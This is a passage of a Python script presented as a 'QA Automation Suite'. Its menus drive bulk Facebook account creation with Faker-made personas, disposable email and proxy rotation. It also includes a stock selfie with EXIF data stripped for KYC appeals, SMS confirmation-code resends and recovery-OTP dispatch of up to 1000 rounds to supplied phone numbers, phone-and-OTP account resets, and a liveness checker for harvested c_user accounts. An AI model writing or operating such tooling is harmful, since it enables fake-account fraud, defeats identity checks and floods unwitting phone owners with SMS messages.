        panel_border = "#F43F5E"
    elif dead_cnt == 0:
        verdict_content = (
            f"[bold #4ADE80]All {len(results)} accounts completed successfully ✅[/]\n"
            f"[bold white]Total Batch Latency:[/] {total_time}s  ·  "
            f"[bold white]Average Time:[/] {round(total_time/max(1, len(results)), 2)}s/run"
        )
        panel_border = "#22C55E"
    else:
        verdict_content = (
            f"[bold white]Total Runs:[/] {len(results)}  ·  "
            f"[bold #4ADE80]Live Accounts ✅:[/] {live_cnt}  ·  "
            f"[bold #82F0AF]90% Done (Awaiting OTP) ✅:[/] {phone_90_cnt}  ·  "
            f"[bold #F59E0B]Appealed ⚠️:[/] {appealed_cnt}  ·  "
            f"[bold #F43F5E]Failed / Other ❌:[/] {dead_cnt}\n"
            f"[bold white]Total Batch Latency:[/] {total_time}s  ·  "
            f"[bold white]Average Time:[/] {round(total_time/max(1, len(results)), 2)}s/run"
        )
        panel_border = "#22C55E"

    console.print(Panel(
        verdict_content,
        border_style=panel_border,
        title="[bold #BEFAD2]QA RUN REPORT VERDICT[/]"
    ))
    console.print(f"   {G0}[+] Verified credentials saved to: {config['output']}{C_RESET}\n")

    return prompt_creation_post_task_menu(config, results)


# ==============================================================================
# Hierarchical Interactive CLI Menu System
# ==============================================================================

def clear_screen():
    sys.stdout.write(C_CLEAR)
    sys.stdout.flush()


def prompt_step_choice(step_title: str, options: List[str], default: int = 1) -> int:
    clear_screen()
    render_eydhm_banner()
    print(f"   {G0}{C_BOLD}▸ {step_title}{C_RESET}\n")
    for idx, opt in enumerate(options, 1):
        def_tag = f" {G1}(Default){C_RESET}" if idx == default else ""
        print(f"   {G2}[{idx}]{C_RESET} {opt}{def_tag}")
    print(f"   {GRAY}[0] Back / Exit{C_RESET}")
    print(f"\n   {G4}─────────────────────────────────────────────────────────────────{C_RESET}")
    while True:
        try:
            val = input(f"   {CYAN}[+] Select Option [0-{len(options)}] (default {default}): {C_RESET}").strip()
            if not val:
                return default
            try:
                choice = int(val)
                if 0 <= choice <= len(options):
                    return choice
            except ValueError:
                pass

            # Smart recovery: check if user pasted phone numbers, c_users, or an existing file path
            if os.path.isfile(val) or "+" in val or re.search(r"\b\d{7,15}\b", val) or "@" in val:
                GlobalInputStash.set(val)
                print(f"   {G1}[*] Detected input data/path ('{val[:35]}...'). Defaulting to option [{default}].{C_RESET}")
                time.sleep(0.6)
                return default
        except (KeyboardInterrupt, EOFError):
            return 0
        print(f"   {ROSE}[!] Invalid choice. Enter a number between 0 and {len(options)}.{C_RESET}")


def prompt_password_choice(settings: Dict[str, Any]) -> Tuple[bool, Optional[str]]:
    """In-between password prompt: use settings password or enter custom."""
    curr_pwd = settings.get("default_password")
    pwd_display = f"'{curr_pwd}'" if curr_pwd else "[Random 14-char High-Entropy]"
    clear_screen()
    render_eydhm_banner()
    print(f"   {G0}{C_BOLD}▸ PASSWORD CONFIGURATION{C_RESET}\n")
    print(f"   {G2}[1]{C_RESET} Use configured password ({pwd_display}) {G1}(Default){C_RESET}")
    print(f"   {G2}[2]{C_RESET} Type custom password now")
    print(f"   {GRAY}[0] Back{C_RESET}")
    print(f"\n   {G4}─────────────────────────────────────────────────────────────────{C_RESET}")

    while True:
        try:
            val = input(f"   {CYAN}[+] Select Option [0-2] (default 1): {C_RESET}").strip()
            choice = 1 if not val else int(val)
            if choice == 0:
                return False, None
            if choice == 1:
                return True, curr_pwd
            if choice == 2:
                while True:
                    custom_p = input(f"   {CYAN}[+] Enter password (min 6 chars, or 0 to back): {C_RESET}").strip()
                    if custom_p == "0":
                        break
                    if len(custom_p) >= 6:
                        return True, custom_p
                    print(f"   {AMBER}[-] Password too short. Minimum 6 characters.{C_RESET}")
        except (ValueError, KeyboardInterrupt, EOFError):
            pass


def prompt_resend_multiplier(default: int = 1) -> int:
    """Prompt for SMS OTP resend multiplier (1-1000). Default is 1 (single send)."""
    clear_screen()
    render_eydhm_banner()
    print(f"   {G0}{C_BOLD}▸ SMS OTP RESEND MULTIPLIER (CONFIRMATION CODE){C_RESET}\n")
    print(f"   {WHITE}Configure how many times the confirmation code should be sent/resent via SMS.{C_RESET}")
    print(f"   {GRAY}Press Enter or leave empty to use default (1x send). Enter 2-1000 to multiply resends.{C_RESET}\n")
    print(f"   {G2}[1]{C_RESET} Single Send (Default 1x) {G1}[Press Enter]{C_RESET}")
    print(f"   {G2}[2-1000]{C_RESET} Resend Multiplier (clicks 'I didn't receive the code' -> 'Resend code to SMS')")
    print(f"\n   {G4}─────────────────────────────────────────────────────────────────{C_RESET}")

    while True:
        try:
            val = input(f"   {CYAN}[+] Resend OTP multiplier (1-1000, default {default} [press Enter]): {C_RESET}").strip()
            if not val:
                return default
            mult = int(val)
            if 1 <= mult <= 1000:
                return mult
        except (ValueError, KeyboardInterrupt, EOFError):
            pass
        print(f"   {ROSE}[!] Invalid multiplier. Please enter an integer between 1 and 1000.{C_RESET}")


def prompt_speed_tier(default_mode: str = "ultra") -> str:
    """Speed tier selection with Ultra Mode as fastest tier."""
    opts = [
        "Ultra Mode (Fastest: persistent session, cookie wipe, zero spawn overhead)",
        "Instant Mode (<=15s/run: strategy=none, atomic input, stripped assets)",
        "Fast Mode (~20s/run: eager loading, tight polling)",
        "Normal Mode (~45s-55s/run: human typing cadence, natural pauses)"
    ]
    mode_map = ["ultra", "instant", "fast", "normal"]
    try:
        def_idx = mode_map.index(default_mode) + 1
    except ValueError:
        def_idx = 1
    choice = prompt_step_choice("EXECUTION SPEED TIER", opts, default=def_idx)
    if choice == 0:
        return default_mode
    return mode_map[choice - 1]


def handle_proxy_routing_rules_menu(settings: Dict[str, Any]):
    """Granular proxy routing rules configuration for each workflow."""
    workflows = [
        ("opt5", "Option 5: Reset Account Password Recovery"),
        ("opt6", "Option 6: Reset OTP Dispatch"),
        ("opt7", "Option 7: Hybrid Mode (Creation + Reset OTP)"),
        ("opt1", "Option 1: Phone Creation (90% Phone)"),
        ("opt3", "Option 3: Email & Phone Mixed Mode")
    ]
    rule_labels = {
        "before_otp_random": "Connect to random proxy before clicking continue on recovery screen (before OTP dispatch)",
        "before_otp_country": "Connect proxy according to phone number country (or fallback random)",
        "browser_launch": "Use random proxy from start of browser launch",
        "disabled": "Disabled (Default)"
    }
    rule_keys = ["before_otp_random", "before_otp_country", "browser_launch", "disabled"]

    while True:
        clear_screen()
        render_eydhm_banner()
        print(f"   {G0}{C_BOLD}▸ GRANULAR PROXY ROUTING RULES{C_RESET}\n")
        print(f"   {AMBER}{C_BOLD}[NOTE: Proxies are not validated by this script; please supply verified working proxies.]{C_RESET}\n")

        routing = settings.get("proxy_routing", {})
        opts = []
        for wf_key, wf_name in workflows:
            active_r = routing.get(wf_key, "disabled")
            active_short = "Before Continue" if active_r == "before_otp_random" else ("Country Matched" if active_r == "before_otp_country" else ("Browser Launch" if active_r == "browser_launch" else "Disabled"))
            opts.append(f"{wf_name} [{G3}{active_short}{C_RESET}]")

        wf_choice = prompt_step_choice("SELECT WORKFLOW TO CONFIGURE ROUTING", opts, default=1)
        if wf_choice == 0:
            break

        selected_key, selected_name = workflows[wf_choice - 1]

        while True:
            clear_screen()
            render_eydhm_banner()
            print(f"   {G0}{C_BOLD}▸ ROUTING RULE FOR: {selected_name.upper()}{C_RESET}\n")
            print(f"   {AMBER}{C_BOLD}[NOTE: Proxies are not validated by this script; please supply verified working proxies.]{C_RESET}\n")
            curr_rule = settings.get("proxy_routing", {}).get(selected_key, "disabled")

            sub_opts = []
            for rk in rule_keys:
                label = rule_labels[rk]
                if rk == curr_rule:
                    sub_opts.append(f"{label} {G3}✔ [Active]{C_RESET}")
                else:
                    sub_opts.append(label)

            def_idx = rule_keys.index(curr_rule) + 1 if curr_rule in rule_keys else 4
            rule_choice = prompt_step_choice(f"SELECT PROXY RULE FOR {selected_name}", sub_opts, default=def_idx)
            if rule_choice == 0:
                break

            new_rule = rule_keys[rule_choice - 1]
            settings.setdefault("proxy_routing", {})[selected_key] = new_rule
            SettingsManager.save(settings)
            print(f"\n   {G3}✔ [Active]{C_RESET} {G1}Updated {selected_name} proxy routing to: '{rule_labels[new_rule]}'{C_RESET}")
            time.sleep(1.0)
            break


def handle_proxy_settings_menu(settings: Dict[str, Any]):
    """Proxy settings submenu with file loading and granular workflow routing."""
    while True:
        clear_screen()
        render_eydhm_banner()
        print(f"   {G0}{C_BOLD}▸ PROXY CONFIGURATION & ROUTING ENGINE{C_RESET}\n")
        print(f"   {AMBER}{C_BOLD}[NOTE: Proxies are not validated by this script; please supply verified working proxies.]{C_RESET}\n")
        curr_p = settings.get("proxy") or "[Direct / None]"
        pool_cnt = len(settings.get("proxy_pool", []))
        pool_display = f"{pool_cnt} loaded" if pool_cnt > 0 else "empty"

        opts = [
            f"Set Single Proxy / Connection String ({curr_p})",
            f"Load Proxies from File (.txt, .json - {pool_display})",
            "Configure Granular Proxy Routing Rules per Workflow",
            "Clear / Reset All Proxies to Direct Connection"
        ]
        choice = prompt_step_choice("PROXY MANAGEMENT", opts, default=1)
        if choice == 0:
            break

        if choice == 1:
            clear_screen()
            render_eydhm_banner()
            print(f"   {G0}{C_BOLD}▸ SET SINGLE PROXY{C_RESET}\n")
            print(f"   {AMBER}[NOTE: Proxies are not validated by this script; please supply verified working proxies.]{C_RESET}\n")
            print(f"   {WHITE}Current Proxy: {settings.get('proxy') or '[None]'}{C_RESET}\n")
            new_proxy = input(f"   {CYAN}[+] Enter Proxy (host:port or user:pass@host:port, blank to cancel): {C_RESET}").strip()
            if new_proxy:
                settings["proxy"] = new_proxy
                SettingsManager.save(settings)
                print(f"\n   {G1}[+] Proxy updated to: {new_proxy}{C_RESET}")
            time.sleep(1.0)

        elif choice == 2:
            clear_screen()
            render_eydhm_banner()
            print(f"   {G0}{C_BOLD}▸ LOAD PROXIES FROM FILE{C_RESET}\n")
            print(f"   {AMBER}[NOTE: Proxies are not validated by this script; please supply verified working proxies.]{C_RESET}\n")
            p_file = input(f"   {CYAN}[+] Enter proxy file path (.txt, .json) or 0 to back: {C_RESET}").strip()
            if p_file and p_file != "0":
                if os.path.isfile(p_file):
                    pm = ProxyManager()
                    pm.load(p_file)
                    if pm.pool:
                        settings["proxy_pool"] = [p["raw"] for p in pm.pool]
                        settings["proxy"] = p_file
                        SettingsManager.save(settings)
                        print(f"\n   {G3}✔ SUCCESS:{C_RESET} {G1}Loaded {len(pm.pool)} proxies from '{p_file}' into persistent pool.{C_RESET}")
                    else:
                        print(f"\n   {ROSE}[!] No valid proxy lines found in '{p_file}'.{C_RESET}")
                else:
                    print(f"\n   {ROSE}[!] File not found: '{p_file}'.{C_RESET}")
                time.sleep(1.5)

        elif choice == 3:
            handle_proxy_routing_rules_menu(settings)

        elif choice == 4:
            settings["proxy"] = None
            settings["proxy_pool"] = []
            settings["proxy_routing"] = SettingsManager.DEFAULTS["proxy_routing"].copy()
            SettingsManager.save(settings)
            print(f"\n   {G1}[+] All proxies cleared. Default direct connection and disabled routing restored.{C_RESET}")
            time.sleep(1.0)


def handle_settings_menu(settings: Dict[str, Any]):
    """Settings submenu handling persistent settings and image URL verification."""
    while True:
        opts = [
            f"Set Default Base Password ({settings.get('default_password') or '[None - Random]'})",
            f"Configure / Add KYC Appeal Image URL ({settings.get('kyc_image_url')[:32]}...)",
            f"Set Default Speed Tier ({settings.get('default_mode', 'ultra').upper()})",
            f"Set Default Target Endpoint Profile ({settings.get('default_endpoint', 'limited')})",
            f"Configure Proxies & Workflow Routing ({settings.get('proxy') or '[Direct]'})",
            "View Full Active Configuration Table"
        ]
        choice = prompt_step_choice("SETTINGS & RESILIENCE CONFIGURATION", opts, default=1)
        if choice == 0:
            break

        if choice == 1:
            clear_screen()
            render_eydhm_banner()
            print(f"   {G0}{C_BOLD}▸ SET DEFAULT BASE PASSWORD{C_RESET}\n")
            print(f"   {GRAY}(Leave blank to clear and use auto-generated passwords){C_RESET}\n")
            new_pwd = input(f"   {CYAN}[+] New Password (min 6 chars, or 0 to back): {C_RESET}").strip()
            if new_pwd == "0":
                continue
            if not new_pwd:
                settings["default_password"] = None
                SettingsManager.save(settings)
                print(f"\n   {G1}[+] Password cleared. Tool will use random passwords.{C_RESET}")
            elif len(new_pwd) >= 6:
                settings["default_password"] = new_pwd
                SettingsManager.save(settings)
                print(f"\n   {G1}[+] Default password updated to: '{new_pwd}'{C_RESET}")
            else:
                print(f"\n   {ROSE}[!] Password must have at least 6 characters. Unchanged.{C_RESET}")
            time.sleep(1.2)

        elif choice == 2:
            clear_screen()
            render_eydhm_banner()
            print(f"   {G0}{C_BOLD}▸ CONFIGURE KYC APPEAL IMAGE URL{C_RESET}\n")
            print(f"   {WHITE}Current URL: {settings.get('kyc_image_url')}{C_RESET}\n")
            new_url = input(f"   {CYAN}[+] Enter New Direct Image URL (or blank to cancel): {C_RESET}").strip()
            if new_url and new_url.startswith("http"):
                print(f"\n   {CYAN}[*] Testing download and validating image buffer...{C_RESET}")
                ok, msg = MediaInjectionService.test_and_cache_image_url(new_url)
                if ok:
                    settings["kyc_image_url"] = new_url
                    SettingsManager.save(settings)
                    print(f"   {G3}✔ SUCCESS: {msg}{C_RESET}")
                    print(f"   {G1}[+] Active appeal image refreshed in sanitized_selfie.jpg{C_RESET}")
                else:
                    print(f"   {ROSE}✘ FAILED: {msg}{C_RESET}")
                    print(f"   {AMBER}[-] Please upload/provide a valid direct image URL. Keeping previous URL.{C_RESET}")
            time.sleep(1.8)

        elif choice == 3:
            tier_choice = prompt_step_choice("DEFAULT EXECUTION SPEED TIER", [
                "Ultra Mode (Fastest: persistent session, cookie wipe)",
                "Instant Mode (<=15s/run)",
                "Fast Mode (~20s/run)",
                "Normal Mode (~45s-55s/run)"
            ], default=1)
            if tier_choice > 0:
                settings["default_mode"] = ["ultra", "instant", "fast", "normal"][tier_choice - 1]
                SettingsManager.save(settings)
                print(f"\n   {G1}[+] Speed tier updated to {settings['default_mode'].upper()}{C_RESET}")
                time.sleep(1.0)

        elif choice == 4:
            ep_choice = prompt_step_choice("DEFAULT TARGET REGISTRATION ENDPOINT", [
                "Limited Edition Mobile (https://limited.facebook.com/reg)",
                "Limited Edition Landing (https://limited.facebook.com)",
                "Standard Web (https://www.facebook.com/r.php)",
                "Mobile Touch (https://m.facebook.com/reg)",
                "Basic / Lightweight (https://mbasic.facebook.com/reg)"
            ], default=1)
            if ep_choice > 0:
                settings["default_endpoint"] = ["limited", "limited_home", "web", "mobile", "mbasic"][ep_choice - 1]
                SettingsManager.save(settings)
                print(f"\n   {G1}[+] Endpoint updated to {settings['default_endpoint']}{C_RESET}")
                time.sleep(1.0)

        elif choice == 5:
            handle_proxy_settings_menu(settings)

        elif choice == 6:
            clear_screen()
            render_eydhm_banner()
            t = Table(title="ACTIVE CONFIGURATION PARAMETERS", border_style="#168C42")
            t.add_column("Parameter", style="#82F0AF")
            t.add_column("Current Setting", style="bold white")
            t.add_row("Default Password", str(settings.get("default_password") or "[Random 14-char]"))
            t.add_row("Speed Tier SLA", str(settings.get("default_mode", "ultra")).upper())
            t.add_row("Target Endpoint", str(settings.get("default_endpoint", "limited")))
            t.add_row("KYC Image URL", str(settings.get("kyc_image_url")))
            t.add_row("Single Proxy", str(settings.get("proxy") or "Direct Connection"))
            pool_cnt = len(settings.get("proxy_pool", []))
            t.add_row("Proxy Pool", f"{pool_cnt} active proxies" if pool_cnt > 0 else "None")
            routing = settings.get("proxy_routing", {})
            for rk, rv in routing.items():
                t.add_row(f"Proxy Routing ({rk.upper()})", str(rv))
            t.add_row("Email Provider", str(settings.get("email_provider", "tempmail_lol")))
            Console().print(t)
            input(f"\n   {CYAN}Press Enter to return to Settings...{C_RESET}")


def confirm_detected_queue(label: str, count: int) -> int:
    """
    Displays confirmation screen matching prompt requirement:
    Detected total: X numbers/pairs.
    [1] Continue
    [2] Edit / re-enter
    [0] Back
    Returns: 1 (continue), 2 (edit/re-enter), 0 (back)
    """
    drain_stdin()
    print(f"\n   {G1}{C_BOLD}[*] Detected total: {count} {label}.{C_RESET}")
    print(f"   {WHITE}[1] Continue")
    print(f"   [2] Edit / re-enter")
    print(f"   [0] Back{C_RESET}\n")
    while True:
        try:
            drain_stdin()
            ch = input(f"   {CYAN}[+] Select option [1-2, 0] (default 1): {C_RESET}").strip()
            drain_stdin()
            if ch in ("1", ""):
                return 1
            if ch == "2":
                return 2
            if ch == "0":
                return 0
        except (EOFError, KeyboardInterrupt):
            return 0
        print(f"   {ROSE}[!] Invalid option. Enter 1, 2, or 0.{C_RESET}")
        drain_stdin()


def interactive_wizard() -> Optional[Dict[str, Any]]:
    """Clean, nested CLI menus matching prompt hierarchy."""
    settings = SettingsManager.load()

    while True:
        clear_screen()
        render_eydhm_banner()
        main_opts = [
            "Create with Phone (Always 90% Phone)",
            "Create with Email (Complete Creation or 90% Email)",
            "Email & Phone (Mix Mode)",
            "Settings (Password, KYC Image URL, Speed, Proxies)",
            "Reset Account",
            "Reset OTP",
            "Hybrid Mode (Phone Create 90% + Option 6 Reset OTP Dispatch)",
            "Check Live Account (c_user Health Audit)"
        ]
        choice = prompt_step_choice("SELECT SYSTEM OPERATION", main_opts, default=1)

        if choice == 0:
            clear_screen()
            print(f"\n   {G1}[*] Exiting QA Automation Suite. Terminal restored.{C_RESET}\n")
            return None

        # ======================================================================
        # Option 1: Create with Phone
        # ======================================================================
        if choice == 1:
            phones = prompt_phone_input_queue("PHONE INGESTION FOR ACCOUNT CREATION", allow_synthetic_default=True)
            if phones is None:
                continue

            contact_source = "\n".join(phones) if phones else None
            queue_len = len(phones) if phones else 1

            # In-between Password prompt
            proceed, pwd_selected = prompt_password_choice(settings)
            if not proceed: continue

            # Resend OTP Multiplier prompt
            resend_mult = prompt_resend_multiplier(settings.get("default_resend_multiplier", 1))

            # Speed Tier prompt
            speed_mode = prompt_speed_tier(settings.get("default_mode", "ultra"))

            return {
                "endpoint": settings.get("default_endpoint", "limited"),
                "mode": speed_mode,
                "contact_mode": "phone",
                "contact_source": contact_source,
                "count": queue_len,
                "resend_multiplier": resend_mult,
                "password": pwd_selected,
                "proxy": settings.get("proxy"),
                "selfie": settings.get("kyc_image_url", DEFAULT_SELFIE_URL),
                "media_method": "file_upload",
                "delay": settings.get("delay", 1.0),
                "ws_port": 8765,
                "output": "phone_accounts.txt",
                "dry_run": False
            }

        # ======================================================================
        # Option 2: Create with Email
        # ======================================================================
        elif choice == 2:
            em_prov_opts = [
                "Use random provider (tempmail.lol / 1secmail)",
                "Use best fast and working provider (tempmail.lol)"
            ]
            em_prov_choice = prompt_step_choice("EMAIL PROVIDER SELECTION", em_prov_opts, default=2)
            if em_prov_choice == 0: continue
            provider_mode = "random" if em_prov_choice == 1 else "tempmail_lol"

            em_type_opts = [
                "Complete creation (retrieve OTP and submit)",
                "90% Email (conclude upon reaching Enter Code screen)"
            ]
            em_type_choice = prompt_step_choice("EMAIL CREATION MODE", em_type_opts, default=1)
            if em_type_choice == 0: continue
            contact_mode = "email" if em_type_choice == 1 else "email_90"

            # In-between Password prompt
            proceed, pwd_selected = prompt_password_choice(settings)
            if not proceed: continue

            clear_screen()
            render_eydhm_banner()
            print(f"   {G0}{C_BOLD}▸ TOTAL ACCOUNTS TO GENERATE{C_RESET}\n")
            while True:
                try:
                    cnt_str = input(f"   {CYAN}[+] Number of accounts (default 1): {C_RESET}").strip()
                    total_count = int(cnt_str) if cnt_str else 1
                    if total_count >= 1: break
                except ValueError: pass
                print(f"   {ROSE}[!] Enter a valid positive integer.{C_RESET}")

            # Speed Tier prompt
            speed_mode = prompt_speed_tier(settings.get("default_mode", "ultra"))

            return {
                "endpoint": settings.get("default_endpoint", "limited"),
                "mode": speed_mode,
                "contact_mode": contact_mode,
                "email_provider_mode": provider_mode,
                "contact_source": None,
                "count": total_count,
                "password": pwd_selected,
                "proxy": settings.get("proxy"),
                "selfie": settings.get("kyc_image_url", DEFAULT_SELFIE_URL),
                "media_method": "file_upload",
                "delay": settings.get("delay", 1.0),
                "ws_port": 8765,
                "output": "phone_accounts.txt",
                "dry_run": False
            }

        # ======================================================================
        # Option 3: Email and Phone (Mix Mode)
        # ======================================================================
        elif choice == 3:
            mix_opts = [
                "Phone + Auto-Provider Email (Dual Registration Flow)",
                "90% Email and Phone"
            ]
            mix_choice = prompt_step_choice("DUAL / MIX MODE SPECIFICATION", mix_opts, default=1)
            if mix_choice == 0: continue

            # Email provider
            em_prov_opts = [
                "Use random provider (tempmail.lol / 1secmail)",
                "Use best fast and working provider (tempmail.lol)"
            ]
            em_prov_choice = prompt_step_choice("EMAIL PROVIDER SELECTION", em_prov_opts, default=2)
            if em_prov_choice == 0: continue
            provider_mode = "random" if em_prov_choice == 1 else "tempmail_lol"

            # Phone source
            phones = prompt_phone_input_queue("PHONE SOURCE FOR MIX MODE", allow_synthetic_default=False)
            if not phones:
                continue
            contact_source = "\n".join(phones)
            queue_len = len(phones)

            # Password & Resend Multiplier & Speed Tier
            proceed, pwd_selected = prompt_password_choice(settings)
            if not proceed: continue
            resend_mult = prompt_resend_multiplier(settings.get("default_resend_multiplier", 1)) if mix_choice == 1 else 1
            speed_mode = prompt_speed_tier(settings.get("default_mode", "ultra"))

            return {
                "endpoint": settings.get("default_endpoint", "limited"),
                "mode": speed_mode,
                "contact_mode": "phone" if mix_choice == 1 else "email_90",
                "email_provider_mode": provider_mode,
                "contact_source": contact_source,
                "count": queue_len,
                "resend_multiplier": resend_mult,
                "password": pwd_selected,
                "proxy": settings.get("proxy"),
                "selfie": settings.get("kyc_image_url", DEFAULT_SELFIE_URL),
                "media_method": "file_upload",
                "delay": settings.get("delay", 1.0),
                "ws_port": 8765,
                "output": "phone_accounts.txt",
                "dry_run": False
            }

        # ======================================================================
        # Option 4: Settings
        # ======================================================================
        elif choice == 4:
            handle_settings_menu(settings)
            continue

        # ======================================================================
        # Option 5: Reset Account
        # ======================================================================
        elif choice == 5:
            pairs = prompt_recovery_pairs_input_queue("ACCOUNT RECOVERY INGESTION (PHONE & OTP)")
            if not pairs:
                continue

            # Password prompt
            proceed, pwd_selected = prompt_password_choice(settings)
            if not proceed: continue

            # Speed Tier SLA
            speed_mode = prompt_speed_tier(settings.get("default_mode", "ultra"))
            return {
                "action": "reset_account",
                "endpoint": settings.get("default_endpoint", "limited"),
                "mode": speed_mode,
                "pairs": pairs,
                "count": len(pairs),
                "password": pwd_selected,
                "proxy": settings.get("proxy"),
                "delay": settings.get("delay", 1.0),
                "ws_port": 8765,
                "headless": (speed_mode in ("ultra", "instant")) or (not os.environ.get("DISPLAY") and not os.environ.get("WAYLAND_DISPLAY")),
                "output": "successful_recovery.txt",
                "dry_run": False
            }

        # ======================================================================
        # Option 6: Reset OTP
        # ======================================================================
        elif choice == 6:
            phones = prompt_phone_input_queue("RESET OTP DISPATCH INGESTION (PHONE NUMBERS)", allow_synthetic_default=False)
            if not phones:
                continue
            pairs = [{"phone": p, "otps": []} for p in phones]

            # Total Recovery OTP Dispatch Rounds Prompt
            clear_screen()
            render_eydhm_banner()
            print(f"   {G0}{C_BOLD}▸ TOTAL RECOVERY OTP DISPATCH ROUNDS{C_RESET}\n")
            print(f"   {GRAY}Enter how many times each phone should be dispatched (1-1000).{C_RESET}\n")
            reco_rounds = 1
            while True:
                try:
                    r_str = input(f"   {CYAN}[+] Recovery OTP Rounds (1-1000, default 1): {C_RESET}").strip()
                    reco_rounds = int(r_str) if r_str else 1
                    if 1 <= reco_rounds <= 1000:
                        break
                except (ValueError, EOFError, KeyboardInterrupt):
                    pass
                print(f"   {ROSE}[!] Please enter an integer between 1 and 1000.{C_RESET}")

            # Speed Tier SLA
            speed_mode = prompt_speed_tier(settings.get("default_mode", "ultra"))
            return {
                "action": "reset_otp",
                "endpoint": settings.get("default_endpoint", "limited"),
                "mode": speed_mode,
                "pairs": pairs,
                "count": len(pairs),
                "reco_rounds": reco_rounds,
                "password": None,
                "proxy": settings.get("proxy"),
                "delay": settings.get("delay", 1.0),
                "ws_port": 8765,
                "headless": (speed_mode in ("ultra", "instant")) or (not os.environ.get("DISPLAY") and not os.environ.get("WAYLAND_DISPLAY")),
                "output": "reco_sms.txt",
                "dry_run": False
            }

        # ======================================================================
        # Option 7: Hybrid Mode (Phone Create 90% + Option 6 Reset OTP Dispatch)
        # ======================================================================
        elif choice == 7:
            phones = prompt_phone_input_queue("HYBRID PHONE INGESTION (CREATION + RESET OTP)", allow_synthetic_default=True)
            if phones is None:
                continue

            contact_source = "\n".join(phones) if phones else None
            queue_len = len(phones) if phones else 1

            # In-between Password prompt
            proceed, pwd_selected = prompt_password_choice(settings)
            if not proceed: continue

            # Resend OTP Multiplier prompt for Phase 1 Creation
            resend_mult = prompt_resend_multiplier(settings.get("default_resend_multiplier", 1))

            # Total Recovery OTP Dispatch Rounds Prompt for Phase 2 Recovery
            clear_screen()
            render_eydhm_banner()
            print(f"   {G0}{C_BOLD}▸ TOTAL RECOVERY OTP DISPATCH ROUNDS (PHASE 2){C_RESET}\n")
            print(f"   {GRAY}Enter how many rounds of Option 6 Reset OTP to run on successfully created accounts (1-1000).{C_RESET}\n")
            reco_rounds = 1
            while True:
                try:
                    r_str = input(f"   {CYAN}[+] Recovery OTP Rounds (1-1000, default 1): {C_RESET}").strip()
                    reco_rounds = int(r_str) if r_str else 1
                    if 1 <= reco_rounds <= 1000:
                        break
                except (ValueError, EOFError, KeyboardInterrupt):
                    pass
                print(f"   {ROSE}[!] Please enter an integer between 1 and 1000.{C_RESET}")

            # Speed Tier SLA
            speed_mode = prompt_speed_tier(settings.get("default_mode", "ultra"))

            return {
                "action": "hybrid_create_and_reco",
                "endpoint": settings.get("default_endpoint", "limited"),
                "mode": speed_mode,
                "contact_mode": "phone",
                "contact_source": contact_source,
                "count": queue_len,
                "resend_multiplier": resend_mult,
                "reco_rounds": reco_rounds,
                "password": pwd_selected,
                "proxy": settings.get("proxy"),
                "selfie": settings.get("kyc_image_url", DEFAULT_SELFIE_URL),
                "media_method": "file_upload",
                "delay": settings.get("delay", 1.0),
                "ws_port": 8765,
                "output": "phone_accounts.txt",
                "dry_run": False
            }

        # ======================================================================
        # Option 8: Check Live Account (c_user Health Audit)
        # ======================================================================
        elif choice == 8:
            cusers = prompt_liveness_input_queue()
            if not cusers:
                continue

            return {
                "action": "check_live_accounts",
                "cusers": cusers,
                "count": len(cusers),
                "output": "live_checked_accounts.txt",
                "dry_run": False
            }


# ==============================================================================
# Comprehensive Unit Test Suite (--test)
# ==============================================================================

def run_unit_tests():
    """Exhaustive testing protocol verifying parser, faker, password, settings, and output logic."""
    print(f"\n   {G0}{C_BOLD}=== RUNNING COMPREHENSIVE QA UNIT TEST SUITE ==={C_RESET}\n")
    passes = 0
    total = 0

    def assert_test(name: str, condition: bool):
        nonlocal passes, total
        total += 1
        if condition:
            passes += 1
            print(f"   {G2}✔ PASS:{C_RESET} {WHITE}{name}{C_RESET}")
        else:
            print(f"   {ROSE}✘ FAIL:{C_RESET} {WHITE}{name}{C_RESET}")

    # Test 1: Contact Queue Parser (Mixed Delimiters & Deduplication)
    raw_mixed = "+12025550101, +1-202-555-0102\n+12025550103; +12025550101\ntest@domain.com, test@domain.com"
    qm = ContactQueueManager(raw_mixed)
    assert_test("Batch Contact Ingestion (Comma, Newline, Semicolon, Deduplication)", qm.count() == 4)

    # Test 2: Input Sanitization (E.164 Digits & Email Formatting)
    assert_test("Phone Number Digit Sanitization", qm.get_next() == "+12025550101")
    assert_test("Second Phone Sanitization", qm.get_next() == "+12025550102")

    # Test 3: Smart Phone Extraction from mixed string (excluding dates/timestamps)
    sample_text = "Log at 2026-10-18 12:00:00: User +1 202 555 0199 and (202) 555-0188. Resolution 1920x1080"
    extracted_p = smart_extract_phones_from_source(sample_text)
    assert_test("Smart Phone Extraction (Filtering Timestamps/Dates/Resolutions)",
                "+12025550199" in extracted_p and "+12025550188" in extracted_p and "19201080" not in extracted_p)

    # Test 4: SettingsManager Load and Save
    cfg = SettingsManager.load()
    assert_test("SettingsManager Load Defaults", "default_mode" in cfg and "kyc_image_url" in cfg)

    # Test 5: Image EXIF Sanitization
    img_path = MediaInjectionService.sanitize_image(DEFAULT_SELFIE_URL)
    sanitized_ok = os.path.isfile(img_path) and os.path.getsize(img_path) > 1000
    assert_test("Pillow Fresh RGB Buffer EXIF Sanitization", sanitized_ok)

    # Test 6: Faker Profile Generation
    ident = generate_identity()
    assert_test("Faker Persona Structure (first_name, last_name, DOB, gender)",
                bool(ident.get("first_name") and ident.get("last_name") and 1984 <= ident.get("year", 0) <= 2004))
    assert_test("Faker Gender Invariant (Male or Female)", ident.get("gender") in ("Male", "Female"))

    # Test 7: Password Complexity & Entropy
    pwd = generate_strong_password(14)
    has_upper = any(c.isupper() for c in pwd)
    has_lower = any(c.islower() for c in pwd)
    has_digit = any(c.isdigit() for c in pwd)
    has_special = any(c in "!@#$%^&*()-_=+" for c in pwd)
    assert_test("Password Complexity (Upper, Lower, Digit, Special, len >= 14)",
                len(pwd) == 14 and has_upper and has_lower and has_digit and has_special)

    # Test 8: File Output Recording
    test_rec = {
        "index": 999,
        "timestamp": "2026-10-18 12:00:00",
        "mode": "test_mode",
        "endpoint": "https://limited.facebook.com/reg",
        "status": "90% DONE ✅ (Awaiting SMS OTP)",
        "name": "QA Test User",
        "gender": "Female",
        "dob": "1998-05-14",
        "contact": "+12025550199",
        "password": "TestPassword123!",
        "otp": "N/A",
        "c_user": "61599999999",
        "cookies": "datr=test; c_user=61599999999",
        "time_taken": 12.5,
        "diagnostics": "Unit test mock persistence verification."
    }
    engine_dummy = EYDHMAutomationEngine({"output": "test_accounts_output.txt"}, EventBus())
    engine_dummy._save_record_to_files(test_rec)
    saved_ok = os.path.isfile("test_accounts_output.txt") and "QA Test User" in open("test_accounts_output.txt").read()
